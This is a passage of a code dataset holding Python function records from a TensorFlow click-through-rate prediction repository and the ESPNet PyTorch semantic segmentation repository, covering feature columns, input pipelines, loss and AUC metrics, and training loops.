{"docstring": "\"\"\"Builds a set of wide and deep feature columns.\"\"\"\n# Continuous variable columns\n# hours_per_week = tf.feature_column.numeric_column('hours_per_week')\n\n", "func_signal": "def build_model_columns():\n", "code": "creative_id = tf.feature_column.categorical_column_with_hash_bucket(\n    'creative_id', hash_bucket_size=200000, dtype=tf.int64)\n# To show an example of hashing:\nhas_target = tf.feature_column.categorical_column_with_identity(\n    'has_target', num_buckets=3)\nterminal = tf.feature_column.categorical_column_with_identity(\n    'terminal', num_buckets=10)\nhour = tf.feature_column.categorical_column_with_identity(\n    'hour', num_buckets=25)\nweekday = tf.feature_column.categorical_column_with_identity(\n    'weekday', num_buckets=10)\nday_user_show = tf.feature_column.bucketized_column(\n    tf.feature_column.numeric_column('day_user_show', dtype=tf.int32), boundaries=DayShowSegs)\nday_user_click = tf.feature_column.bucketized_column(\n    tf.feature_column.numeric_column('day_user_click', dtype=tf.int32), boundaries=DayClickSegs)\n\ncity_code = tf.feature_column.categorical_column_with_hash_bucket(\n    'city_code', hash_bucket_size=2000, dtype=tf.int64)\n\nnetwork_type = tf.feature_column.categorical_column_with_identity(\n    'network_type', num_buckets=20, default_value=19)\n\ndevice_type = tf.feature_column.categorical_column_with_hash_bucket(   #androidphone\u8fd9\u4e9b\n    'device_type', hash_bucket_size=500000, dtype=tf.string\n)\ndevice_model = tf.feature_column.categorical_column_with_hash_bucket(  #\u578b\u53f7\u5982iPhone10  vivo X9\n    'device_model', hash_bucket_size=200000, dtype=tf.string\n)\nmanufacturer = tf.feature_column.categorical_column_with_hash_bucket(  #\u624b\u673a\u54c1\u724c vivo iphone\u7b49\n    'manufacturer', hash_bucket_size=50000, dtype=tf.string\n)\n\n\ndeep_columns = [\n    tf.feature_column.embedding_column(creative_id, dimension=15,combiner='sum'),\n    tf.feature_column.embedding_column(has_target, dimension=15,combiner='sum'),\n    tf.feature_column.embedding_column(terminal, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(hour, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(weekday, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(day_user_show, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(day_user_click, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(city_code, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(network_type, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(device_type, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(device_model, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(manufacturer, dimension=15, combiner='sum'),\n\n]\n# base_columns = [user_id, ad_id, creative_id,  product_id, brush_num, terminal,terminal_brand]\n'''\ncrossed_columns = [tf.feature_column.crossed_column(\n                        ['userId', 'adId'], hash_bucket_size = 50000000),\n                  \u3001\u3001\u3001\n                  ]\n'''\nreturn deep_columns", "path": "DeepCross\\input_fn.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Generate an input function for the Estimator.\"\"\"\n\n", "func_signal": "def feature_input_fn(data_file, num_epochs, shuffle, batch_size, labels=True):\n", "code": "def parse_tfrecord(value):\n  tf.logging.info('Parsing {}'.format(data_file[:10]))\n  FixedLenFeatures = {\n      key: tf.FixedLenFeature(shape=[1], dtype=tf.int64) for key in FixedLenFeatureColumns\n  }\n\n  StringVarLenFeatures = {\n      key: tf.VarLenFeature(dtype=tf.string) for key in StringVarLenFeatureColumns\n  }\n  FloatFixedLenFeatures = {\n      key: tf.FixedLenFeature(shape=[1], dtype=tf.float32) for key in FloatFixedLenFeatureColumns\n  }\n  StringFixedLenFeatures = {\n      key: tf.FixedLenFeature(shape=[20], dtype=tf.string) for key in StringFixedLenFeatureColumns\n  }\n  StringFeatures = {\n      key: tf.FixedLenFeature(shape=[1], dtype=tf.string) for key in StringFeatureColumns\n  }\n  features={}\n  features.update(FixedLenFeatures)\n  features.update(StringVarLenFeatures)\n  features.update(FloatFixedLenFeatures)\n  features.update(StringFixedLenFeatures)\n  features.update(StringFeatures)\n  \n  fea = tf.parse_example(value, features)\n  feature = {\n      key: fea[key] for key in features\n  }\n  classes = tf.to_float(feature['label'])\n  return feature, classes\n\n# Extract lines from input files using the Dataset API.\nfilenames = tf.data.Dataset.list_files(data_file)\ndataset = filenames.apply(tf.contrib.data.parallel_interleave(\n    lambda filename: tf.data.TFRecordDataset(filename),\n    cycle_length=32))\n\nif shuffle:\n  dataset = dataset.shuffle(buffer_size=batch_size*64)\n\ndataset = dataset.repeat(num_epochs).batch(batch_size).prefetch(buffer_size=batch_size*8)\ndataset = dataset.map(parse_tfrecord, num_parallel_calls=32)\n\nreturn dataset", "path": "DeepCross\\input_fn.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "# Build the hidden layers, sized according to the 'hidden_units' param.\n\n", "func_signal": "def build_deep_layers(net, params):\n", "code": "for layer_id, num_hidden_units in enumerate(params['hidden_units']):\n    net = tf.layers.dense(net, units=num_hidden_units, activation=tf.nn.relu,\n                          kernel_initializer=tf.glorot_uniform_initializer())\nreturn net", "path": "ResNet\\resnet.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Export to SavedModel format.\n\nArgs:\n  model: Estimator object\n  export_dir: directory to export the model.\n  model_column_fn: Function to generate model feature columns.\n\"\"\"\n", "func_signal": "def export_model(model, export_dir, model_column_fn):\n", "code": "columns = model_column_fn\ncolumns.append(tf.feature_column.numeric_column(\"user_id\", default_value=123456, dtype=tf.int64))\ncolumns.append(tf.feature_column.numeric_column(\"label\", default_value=0, dtype=tf.int64))\nfeature_spec = tf.feature_column.make_parse_example_spec(columns)\nexample_input_fn = (\n    tf.estimator.export.build_parsing_serving_input_receiver_fn(feature_spec))\nmodel.export_savedmodel(export_dir, example_input_fn)", "path": "AFM\\train.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Register benchmarking flags.\n\nArgs:\n  benchmark_log_dir: Create a flag to specify location for benchmark logging.\n  bigquery_uploader: Create flags for uploading results to BigQuery.\n\nReturns:\n  A list of flags for core.py to marks as key flags.\n\"\"\"\n\n", "func_signal": "def define_benchmark(benchmark_log_dir=True, bigquery_uploader=True):\n", "code": "key_flags = []\n\nflags.DEFINE_enum(\n    name=\"benchmark_logger_type\", default=\"BaseBenchmarkLogger\",\n    enum_values=[\"BaseBenchmarkLogger\", \"BenchmarkFileLogger\",\n                 \"BenchmarkBigQueryLogger\"],\n    help=help_wrap(\"The type of benchmark logger to use. Defaults to using \"\n                   \"BaseBenchmarkLogger which logs to STDOUT. Different \"\n                   \"loggers will require other flags to be able to work.\"))\nflags.DEFINE_string(\n    name=\"benchmark_test_id\", short_name=\"bti\", default=None,\n    help=help_wrap(\"The unique test ID of the benchmark run. It could be the \"\n                   \"combination of key parameters. It is hardware \"\n                   \"independent and could be used compare the performance \"\n                   \"between different test runs. This flag is designed for \"\n                   \"human consumption, and does not have any impact within \"\n                   \"the system.\"))\n\nif benchmark_log_dir:\n  flags.DEFINE_string(\n      name=\"benchmark_log_dir\", short_name=\"bld\", default=None,\n      help=help_wrap(\"The location of the benchmark logging.\")\n  )\n\nif bigquery_uploader:\n  flags.DEFINE_string(\n      name=\"gcp_project\", short_name=\"gp\", default=None,\n      help=help_wrap(\n          \"The GCP project name where the benchmark will be uploaded.\"))\n\n  flags.DEFINE_string(\n      name=\"bigquery_data_set\", short_name=\"bds\", default=\"test_benchmark\",\n      help=help_wrap(\n          \"The Bigquery dataset name where the benchmark will be uploaded.\"))\n\n  flags.DEFINE_string(\n      name=\"bigquery_run_table\", short_name=\"brt\", default=\"benchmark_run\",\n      help=help_wrap(\"The Bigquery table name where the benchmark run \"\n                     \"information will be uploaded.\"))\n\n  flags.DEFINE_string(\n      name=\"bigquery_run_status_table\", short_name=\"brst\",\n      default=\"benchmark_run_status\",\n      help=help_wrap(\"The Bigquery table name where the benchmark run \"\n                     \"status information will be uploaded.\"))\n\n  flags.DEFINE_string(\n      name=\"bigquery_metric_table\", short_name=\"bmt\",\n      default=\"benchmark_metric\",\n      help=help_wrap(\"The Bigquery table name where the benchmark metric \"\n                     \"information will be uploaded.\"))\n\n@flags.multi_flags_validator(\n    [\"benchmark_logger_type\", \"benchmark_log_dir\"],\n    message=\"--benchmark_logger_type=BenchmarkFileLogger will require \"\n            \"--benchmark_log_dir being set\")\ndef _check_benchmark_log_dir(flags_dict):\n  benchmark_logger_type = flags_dict[\"benchmark_logger_type\"]\n  if benchmark_logger_type == \"BenchmarkFileLogger\":\n    return flags_dict[\"benchmark_log_dir\"]\n  return True\n\nreturn key_flags", "path": "official\\utils\\flags\\_benchmark.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"calculate cross_entropy_loss\n\n  loss = -labels*log(preds)-(1-labels)*log(1-preds)\n\n  Args:\n    labels, preds\n\n  Returns:\n     log loss\n\"\"\"\n\n", "func_signal": "def cross_entropy_loss(labels, preds):\n", "code": "if len(labels) != len(preds):\n    raise ValueError(\n        \"labels num should equal to the preds num,\")\n\nz = np.array(labels)\nx = np.array(preds)\nres = -z * np.log(x) - (1 - z) * np.log(1 - x)\nreturn res.tolist()", "path": "XDeepFM\\metric.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"calculate cross_entropy_loss\n\n  loss = -labels*log(preds)-(1-labels)*log(1-preds)\n\n  Args:\n    labels, preds\n\n  Returns:\n     log loss\n\"\"\"\n\n", "func_signal": "def cross_entropy_loss(labels, preds):\n", "code": "if len(labels) != len(preds):\n    raise ValueError(\n        \"labels num should equal to the preds num,\")\n\nz = np.array(labels)\nx = np.array(preds)\nres = -z * np.log(x) - (1 - z) * np.log(1 - x)\nreturn res.tolist()", "path": "ESMM\\metric.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"calculate cross_entropy_loss\n\n  loss = -labels*log(preds)-(1-labels)*log(1-preds)\n\n  Args:\n    labels, preds\n\n  Returns:\n     log loss\n\"\"\"\n\n", "func_signal": "def cross_entropy_loss(labels, preds):\n", "code": "if len(labels) != len(preds):\n    raise ValueError(\n        \"labels num should equal to the preds num,\")\n\nz = np.array(labels)\nx = np.array(preds)\nres = -z * np.log(x) - (1 - z) * np.log(1 - x)\nreturn res.tolist()", "path": "DeepCross\\metric.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Calculate group auc\"\"\"\n\n", "func_signal": "def cal_group_auc(labels, preds, user_id_list):\n", "code": "print('*' * 50)\nif len(user_id_list) != len(labels):\n    raise ValueError(\n        \"impression id num should equal to the sample num,\" \\\n        \"impression id num is {0}\".format(len(user_id_list)))\ngroup_score = defaultdict(lambda: [])\ngroup_truth = defaultdict(lambda: [])\nfor idx, truth in enumerate(labels):\n    user_id = user_id_list[idx]\n    score = preds[idx]\n    truth = labels[idx]\n    group_score[user_id].append(score)\n    group_truth[user_id].append(truth)\n\ngroup_flag = defaultdict(lambda: False)\nfor user_id in set(user_id_list):\n    truths = group_truth[user_id]\n    flag = False\n    for i in range(len(truths) - 1):\n        if truths[i] != truths[i + 1]:\n            flag = True\n            break\n    group_flag[user_id] = flag\n\nimpression_total = 0\ntotal_auc = 0\n#\nfor user_id in group_flag:\n    if group_flag[user_id]:\n        auc = roc_auc_score(np.asarray(group_truth[user_id]), np.asarray(group_score[user_id]))\n        total_auc += auc * len(group_truth[user_id])\n        impression_total += len(group_truth[user_id])\ngroup_auc = float(total_auc) / impression_total\ngroup_auc = round(group_auc, 4)\nreturn group_auc", "path": "DeepCross\\metric.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Builds a set of wide and deep feature columns.\"\"\"\n# Continuous variable columns\n# hours_per_week = tf.feature_column.numeric_column('hours_per_week')\n\n", "func_signal": "def build_model_columns():\n", "code": "creative_id = tf.feature_column.categorical_column_with_hash_bucket(\n    'creative_id', hash_bucket_size=200000, dtype=tf.int64)\n# To show an example of hashing:\nhas_target = tf.feature_column.categorical_column_with_identity(\n    'has_target', num_buckets=3)\nterminal = tf.feature_column.categorical_column_with_identity(\n    'terminal', num_buckets=10)\nhour = tf.feature_column.categorical_column_with_identity(\n    'hour', num_buckets=25)\nweekday = tf.feature_column.categorical_column_with_identity(\n    'weekday', num_buckets=10)\nday_user_show = tf.feature_column.bucketized_column(\n    tf.feature_column.numeric_column('day_user_show', dtype=tf.int32), boundaries=DayShowSegs)\nday_user_click = tf.feature_column.bucketized_column(\n    tf.feature_column.numeric_column('day_user_click', dtype=tf.int32), boundaries=DayClickSegs)\n\ncity_code = tf.feature_column.categorical_column_with_hash_bucket(\n    'city_code', hash_bucket_size=2000, dtype=tf.int64)\n\nnetwork_type = tf.feature_column.categorical_column_with_identity(\n    'network_type', num_buckets=20, default_value=19)\n\ndevice_type = tf.feature_column.categorical_column_with_hash_bucket(   #androidphone\u8fd9\u4e9b\n    'device_type', hash_bucket_size=500000, dtype=tf.string\n)\ndevice_model = tf.feature_column.categorical_column_with_hash_bucket(  #\u578b\u53f7\u5982iPhone10  vivo X9\n    'device_model', hash_bucket_size=200000, dtype=tf.string\n)\nmanufacturer = tf.feature_column.categorical_column_with_hash_bucket(  #\u624b\u673a\u54c1\u724c vivo iphone\u7b49\n    'manufacturer', hash_bucket_size=50000, dtype=tf.string\n)\n\n\ndeep_columns = [\n    tf.feature_column.embedding_column(creative_id, dimension=15,combiner='sum'),\n    tf.feature_column.embedding_column(has_target, dimension=15,combiner='sum'),\n    tf.feature_column.embedding_column(terminal, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(hour, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(weekday, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(day_user_show, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(day_user_click, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(city_code, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(network_type, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(device_type, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(device_model, dimension=15, combiner='sum'),\n    tf.feature_column.embedding_column(manufacturer, dimension=15, combiner='sum'),\n\n]\n# base_columns = [user_id, ad_id, creative_id,  product_id, brush_num, terminal,terminal_brand]\n'''\ncrossed_columns = [tf.feature_column.crossed_column(\n                        ['userId', 'adId'], hash_bucket_size = 50000000),\n                  \u3001\u3001\u3001\n                  ]\n'''\nreturn deep_columns", "path": "Transformer\\input_fn.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Display evaluate result.\"\"\"\n", "func_signal": "def model_predict(model, eval_input_fn, epoch):\n", "code": "prediction_result = model.predict(eval_input_fn)\n\nclick_sum = 0.0\npredictions = []\nuser_id_list = []\nlabels = []\nnum_samples = FLAGS.batch_size * FLAGS.predict_steps\nnum_pre_samples = 0\nprint(num_samples)\nfor pred_dict in prediction_result:\n    # print(pred_dict)\n    user_id = pred_dict['user_id'][0]\n    p = pred_dict['probabilities'][0]\n    label = float(pred_dict['label'][0])\n    click_sum += p\n    predictions.append(p)\n    user_id_list.append(user_id)\n    labels.append(label)\n    if (p >= 0.5):\n        num_pre_samples += 1\n\n    if len(predictions) % (num_samples / 10) == 0:\n        tf.logging.info('predict at step %d/%d', int(float(len(predictions)) / num_samples * FLAGS.predict_steps),\n                        FLAGS.predict_steps)\n    if len(predictions) >= num_samples:\n        break\n\n#tf.metrics.precision\n# print(len(predictions))\nnum_samples = len(predictions)\nprint('the predicted positive samples is: ' + str(num_pre_samples))\n# Display evaluation metrics\n\nlabel_mean = sum(labels) / num_samples\nprediction_mean = sum(predictions) / num_samples\nloss = sum(cross_entropy_loss(labels, predictions)) / num_samples * FLAGS.batch_size\nauc = roc_auc_score(labels, predictions)\ngroup_auc = cal_group_auc(labels, predictions, user_id_list)\n\npredict_diff = np.array(predictions) - prediction_mean\npredict_diff_square_sum = sum(np.square(predict_diff))\ns_deviation = np.sqrt(predict_diff_square_sum / num_samples)\nc_deviation = s_deviation / prediction_mean\n\ntrue_positive_samples = (np.array(predictions) * np.array(labels) >= 0.5).tolist().count(True)\nfalse_positive_samples = (np.array(predictions) * (1 - np.array(labels)) >= 0.5).tolist().count(True)\nprint(true_positive_samples)\nprint(false_positive_samples)\n# precision = float(true_positive_samples)/(true_positive_samples+false_positive_samples)\nprecision = 0\nfalse_negative_samples = (np.array(predictions) * np.array(labels) < 0.5).tolist().count(True)\nrecall = float(true_positive_samples) / (true_positive_samples + false_negative_samples)\nprint(false_negative_samples)\ntf.logging.info('Results at epoch %d/%d', (epoch + 1), FLAGS.num_epochs)\ntf.logging.info('-' * 60)\ntf.logging.info('label/mean: %s' % label_mean)\ntf.logging.info('predictions/mean: %s' % prediction_mean)\ntf.logging.info('total loss average batchsize: %s' % loss)\ntf.logging.info('standard deviation: %s' % s_deviation)\ntf.logging.info('coefficient of variation: %s' % c_deviation)\ntf.logging.info('precision: %s' % precision)\ntf.logging.info('recall: %s' % recall)\ntf.logging.info('auc: %s' % auc)\ntf.logging.info('group auc: %s' % group_auc)", "path": "AFM\\train.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "# Build the hidden layers, sized according to the 'hidden_units' param.\n", "func_signal": "def build_residual_layers(net, params):\n", "code": "net = tf.layers.batch_normalization(net)\nshortcut = net\nresidual = tf.layers.dense(net, units=256, activation=tf.nn.relu,\n                          kernel_initializer=tf.glorot_uniform_initializer())\nnet = tf.concat([shortcut, residual], 1)\nnet = tf.layers.batch_normalization(net)\nnet = tf.layers.dense(net, units=256, activation=tf.nn.relu,\n                          kernel_initializer=tf.glorot_uniform_initializer())\n\nnet = tf.layers.batch_normalization(net)\nshortcut = net\nresidual = tf.layers.dense(net, units=128, activation=tf.nn.relu,\n                           kernel_initializer=tf.glorot_uniform_initializer())\nnet = tf.concat([shortcut, residual], 1)\nnet = tf.layers.batch_normalization(net)\nnet = tf.layers.dense(net, units=128, activation=tf.nn.relu,\n                      kernel_initializer=tf.glorot_uniform_initializer())\n\nreturn net", "path": "ResNet\\resnet.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Display evaluate result.\"\"\"\n", "func_signal": "def model_predict(model, eval_input_fn, epoch):\n", "code": "prediction_result = model.predict(eval_input_fn)\n\nclick_sum = 0.0\npredictions = []\nuser_id_list = []\nlabels = []\nnum_samples = FLAGS.batch_size * FLAGS.predict_steps\nnum_pre_samples = 0\nprint(num_samples)\nfor pred_dict in prediction_result:\n    # print(pred_dict)\n    user_id = pred_dict['user_id'][0]\n    p = pred_dict['probabilities'][0]\n    label = float(pred_dict['label'][0])\n    click_sum += p\n    predictions.append(p)\n    user_id_list.append(user_id)\n    labels.append(label)\n    if (p >= 0.5):\n        num_pre_samples += 1\n\n    if len(predictions) % (num_samples / 10) == 0:\n        tf.logging.info('predict at step %d/%d', int(float(len(predictions)) / num_samples * FLAGS.predict_steps),\n                        FLAGS.predict_steps)\n    if len(predictions) >= num_samples:\n        break\n\n#tf.metrics.precision\n# print(len(predictions))\nnum_samples = len(predictions)\nprint('the predicted positive samples is: ' + str(num_pre_samples))\n# Display evaluation metrics\n\nlabel_mean = sum(labels) / num_samples\nprediction_mean = sum(predictions) / num_samples\nloss = sum(cross_entropy_loss(labels, predictions)) / num_samples * FLAGS.batch_size\nauc = roc_auc_score(labels, predictions)\ngroup_auc = cal_group_auc(labels, predictions, user_id_list)\n\npredict_diff = np.array(predictions) - prediction_mean\npredict_diff_square_sum = sum(np.square(predict_diff))\ns_deviation = np.sqrt(predict_diff_square_sum / num_samples)\nc_deviation = s_deviation / prediction_mean\n\ntrue_positive_samples = (np.array(predictions) * np.array(labels) >= 0.5).tolist().count(True)\nfalse_positive_samples = (np.array(predictions) * (1 - np.array(labels)) >= 0.5).tolist().count(True)\nprint(true_positive_samples)\nprint(false_positive_samples)\n# precision = float(true_positive_samples)/(true_positive_samples+false_positive_samples)\nprecision = 0\nfalse_negative_samples = (np.array(predictions) * np.array(labels) < 0.5).tolist().count(True)\nrecall = float(true_positive_samples) / (true_positive_samples + false_negative_samples)\nprint(false_negative_samples)\ntf.logging.info('Results at epoch %d/%d', (epoch + 1), FLAGS.num_epochs)\ntf.logging.info('-' * 60)\ntf.logging.info('label/mean: %s' % label_mean)\ntf.logging.info('predictions/mean: %s' % prediction_mean)\ntf.logging.info('total loss average batchsize: %s' % loss)\ntf.logging.info('standard deviation: %s' % s_deviation)\ntf.logging.info('coefficient of variation: %s' % c_deviation)\ntf.logging.info('precision: %s' % precision)\ntf.logging.info('recall: %s' % recall)\ntf.logging.info('auc: %s' % auc)\ntf.logging.info('group auc: %s' % group_auc)", "path": "XDeepFM\\train.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "\"\"\"Generate an input function for the Estimator.\"\"\"\n\n", "func_signal": "def feature_input_fn(data_file, num_epochs, shuffle, batch_size, labels=True):\n", "code": "def parse_tfrecord(value):\n  tf.logging.info('Parsing {}'.format(data_file[:10]))\n  FixedLenFeatures = {\n      key: tf.FixedLenFeature(shape=[1], dtype=tf.int64) for key in FixedLenFeatureColumns\n  }\n\n  StringVarLenFeatures = {\n      key: tf.VarLenFeature(dtype=tf.string) for key in StringVarLenFeatureColumns\n  }\n  FloatFixedLenFeatures = {\n      key: tf.FixedLenFeature(shape=[1], dtype=tf.float32) for key in FloatFixedLenFeatureColumns\n  }\n  StringFixedLenFeatures = {\n      key: tf.FixedLenFeature(shape=[20], dtype=tf.string) for key in StringFixedLenFeatureColumns\n  }\n  StringFeatures = {\n      key: tf.FixedLenFeature(shape=[1], dtype=tf.string) for key in StringFeatureColumns\n  }\n  AttFeatures = {\n      key: tf.FixedLenFeature(shape=[10], dtype=tf.string) for key in AttFixedLenFeatureColumns\n  }\n  features={}\n  features.update(FixedLenFeatures)\n  features.update(StringVarLenFeatures)\n  features.update(FloatFixedLenFeatures)\n  features.update(StringFixedLenFeatures)\n  features.update(StringFeatures)\n  features.update(AttFeatures)\n  \n  fea = tf.parse_example(value, features)\n  feature = {\n      key: fea[key] for key in features\n  }\n  classes = tf.to_float(feature['label'])\n  return feature, classes\n\n# Extract lines from input files using the Dataset API.\nfilenames = tf.data.Dataset.list_files(data_file)\ndataset = filenames.apply(tf.contrib.data.parallel_interleave(\n    lambda filename: tf.data.TFRecordDataset(filename),\n    cycle_length=32))\n\nif shuffle:\n  dataset = dataset.shuffle(buffer_size=batch_size*64)\n\ndataset = dataset.repeat(num_epochs).batch(batch_size).prefetch(buffer_size=batch_size*8)\ndataset = dataset.map(parse_tfrecord, num_parallel_calls=32)\n\nreturn dataset", "path": "Transformer\\input_fn.py", "repo_name": "qiaoguan/deep-ctr-prediction", "stars": 885, "license": "None", "language": "python", "size": 507}
{"docstring": "'''\n:param args: general arguments\n:param train_loader: loaded for training dataset\n:param model: model\n:param criterion: loss function\n:param optimizer: optimization algo, such as ADAM or SGD\n:param epoch: epoch number\n:return: average epoch loss, overall pixel-wise accuracy, per class accuracy, per class iu, and mIOU\n'''\n# switch to train mode\n", "func_signal": "def train(args, train_loader, model, criterion, optimizer, epoch):\n", "code": "model.train()\n\niouEvalTrain = iouEval(args.classes)\n\nepoch_loss = []\n\ntotal_batches = len(train_loader)\nfor i, (input, target) in enumerate(train_loader):\n    start_time = time.time()\n\n    if args.onGPU == True:\n        input = input.cuda()\n        target = target.cuda()\n\n    input_var = torch.autograd.Variable(input)\n    target_var = torch.autograd.Variable(target)\n\n    #run the mdoel\n    output = model(input_var)\n\n    #set the grad to zero\n    optimizer.zero_grad()\n    loss = criterion(output, target_var)\n\n    optimizer.zero_grad()\n    loss.backward()\n    optimizer.step()\n\n    epoch_loss.append(loss.data[0])\n    time_taken = time.time() - start_time\n\n    #compute the confusion matrix\n    iouEvalTrain.addBatch(output.max(1)[1].data, target_var.data)\n\n    print('[%d/%d] loss: %.3f time:%.2f' % (i, total_batches, loss.data[0], time_taken))\n\naverage_epoch_loss_train = sum(epoch_loss) / len(epoch_loss)\n\noverall_acc, per_class_acc, per_class_iu, mIOU = iouEvalTrain.getMetric()\n\nreturn average_epoch_loss_train, overall_acc, per_class_acc, per_class_iu, mIOU", "path": "train\\main.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param crop_area: area to be cropped (this is the max value and we select between o and crop area\n'''\n", "func_signal": "def __init__(self, crop_area):\n", "code": "self.cw = crop_area\nself.ch = crop_area", "path": "train\\Transforms.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\n:param img: RGB image\n:param label: semantic label image\n:return: resized images\n'''\n#bilinear interpolation for RGB image\n", "func_signal": "def __call__(self, img, label):\n", "code": "img = cv2.resize(img, (self.w, self.h))\n# nearest neighbour interpolation for label image\nlabel = cv2.resize(label, (self.w, self.h), interpolation=cv2.INTER_NEAREST)\n\nreturn [img, label]", "path": "train\\Transforms.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\nhelper function to see total network parameters\n:param model: model\n:return: total network parameters\n'''\n", "func_signal": "def netParams(model):\n", "code": "total_paramters = 0\nfor parameter in model.parameters():\n    i = len(parameter.size())\n    p = 1\n    for j in range(i):\n        p *= parameter.size(j)\n    total_paramters += p\n\nreturn total_paramters", "path": "train\\main.py", "repo_name": "sacmehta/ESPNet", "stars": 519, "license": "mit", "language": "python", "size": 32664}
{"docstring": "'''\nMain function for trainign and validation\n:param args: global arguments\n:return: None\n'''\n# check if processed data file exists or not\n", "func_signal": "def trainValidateSegmentation(args):\n", "code": "if not os.path.isfile(args.cached_data_file):\n    dataLoad = ld.LoadData(args.data_dir, args.classes, args.cached_data_file)\n    data = dataLoad.processData()\n    if data is None:\n        print('Error while pickling data. Please check.')\n        exit(-1)\nelse:\n    data = pickle.load(open(args.cached_data_file, \"rb\"))\n\nq = args.q\np = args.p\n# load the model\nif not args.decoder:\n    model = net.ESPNet_Encoder(args.classes, p=p, q=q)\n    args.savedir = args.savedir + '_enc_' + str(p) + '_' + str(q) + '/'\nelse:\n    model = net.ESPNet(args.classes, p=p, q=q, encoderFile=args.pretrained)\n    args.savedir = args.savedir + '_dec_' + str(p) + '_' + str(q) + '/'\n\nif args.onGPU:\n    model = model.cuda()\n\n# create the directory if not exist\nif not os.path.exists(args.savedir):\n    os.mkdir(args.savedir)\n\nif args.visualizeNet:\n    x = Variable(torch.randn(1, 3, args.inWidth, args.inHeight))\n\n    if args.onGPU:\n        x = x.cuda()\n\n    y = model.forward(x)\n    g = viz.make_dot(y)\n    g.render(args.savedir + 'model.png', view=False)\n\ntotal_paramters = netParams(model)\nprint('Total network parameters: ' + str(total_paramters))\n\n# define optimization criteria\nweight = torch.from_numpy(data['classWeights']) # convert the numpy array to torch\nif args.onGPU:\n    weight = weight.cuda()\n\ncriteria = CrossEntropyLoss2d(weight) #weight\n\nif args.onGPU:\n    criteria = criteria.cuda()\n\nprint('Data statistics')\nprint(data['mean'], data['std'])\nprint(data['classWeights'])\n\n#compose the data with transforms\ntrainDataset_main = myTransforms.Compose([\n    myTransforms.Normalize(mean=data['mean'], std=data['std']),\n    myTransforms.Scale(1024, 512),\n    myTransforms.RandomCropResize(32),\n    myTransforms.RandomFlip(),\n    #myTransforms.RandomCrop(64).\n    myTransforms.ToTensor(args.scaleIn),\n    #\n])\n\ntrainDataset_scale1 = myTransforms.Compose([\n    myTransforms.Normalize(mean=data['mean'], std=data['std']),\n    myTransforms.Scale(1536, 768), # 1536, 768\n    myTransforms.RandomCropResize(100),\n    myTransforms.RandomFlip(),\n    #myTransforms.RandomCrop(64),\n    myTransforms.ToTensor(args.scaleIn),\n    #\n])\n\ntrainDataset_scale2 = myTransforms.Compose([\n    myTransforms.Normalize(mean=data['mean'], std=data['std']),\n    myTransforms.Scale(1280, 720), # 1536, 768\n    myTransforms.RandomCropResize(100),\n    myTransforms.RandomFlip(),\n    #myTransforms.RandomCrop(64),\n    myTransforms.ToTensor(args.scaleIn),\n    #\n])\n\ntrainDataset_scale3 = myTransforms.Compose([\n    myTransforms.Normalize(mean=data['mean'], std=data['std']),\n    myTransforms.Scale(768, 384),\n    myTransforms.RandomCropResize(32),\n    myTransforms.RandomFlip(),\n    #myTransforms.RandomCrop(64),\n    myTransforms.ToTensor(args.scaleIn),\n    #\n])\n\ntrainDataset_scale4 = myTransforms.Compose([\n    myTransforms.Normalize(mean=data['mean'], std=data['std']),\n    myTransforms.Scale(512, 256),\n    #myTransforms.RandomCropResize(20),\n    myTransforms.RandomFlip(),\n    #myTransforms.RandomCrop(64).\n    myTransforms.ToTensor(args.scaleIn),\n    #\n])\n\n\nvalDataset = myTransforms.Compose([\n    myTransforms.Normalize(mean=data['mean'], std=data['std']),\n    myTransforms.Scale(1024, 512),\n    myTransforms.ToTensor(args.scaleIn),\n    #\n])\n\n# since we training from scratch, we create data loaders at different scales\n# so that we can generate more augmented data and prevent the network from 